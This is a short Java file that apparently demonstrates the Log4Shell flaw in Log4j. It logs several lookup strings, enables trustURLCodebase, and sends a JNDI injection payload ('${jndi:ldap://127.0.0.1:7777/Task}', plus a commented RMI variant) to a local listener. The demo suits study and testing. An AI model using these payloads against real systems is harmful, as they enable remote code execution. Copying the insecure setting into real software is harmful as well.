package com.github;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

import java.util.UUID;

/**
 * date 2021/12/12 14:14
 *
 * @author hjl
 */
public class App {

    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String uuid = UUID.randomUUID().toString();
        ThreadContext.put("loginId", uuid);

        logger.debug("ctx.loginId: {}", "${ctx:loginId}");
        logger.debug("date: {}", "${date:MM-dd-yyyy}");
        logger.debug("env.USER: {}", "${env:USER}");
        logger.debug("event.ThreadId: {}", "${event:ThreadId}");
        logger.debug("java.vm: {}", "${java:vm}");
        logger.debug("log4j:configParentLocation {}", "${log4j:configParentLocation}");

//        logger.debug("System.getProperty(log4j2.formatMsgNoLookups): {}", System.getProperty("log4j2.formatMsgNoLookups"));
//        logger.debug("System.getProperty(FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS): {}", System.getProperty("FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS"));
        // RMI 协议
//        logger.debug("username: {}", "${jndi:rmi://127.0.0.1:1099/task}");
        // LDAP 协议
        logger.debug("username: {}", "${jndi:ldap://127.0.0.1:7777/Task}");
    }
}
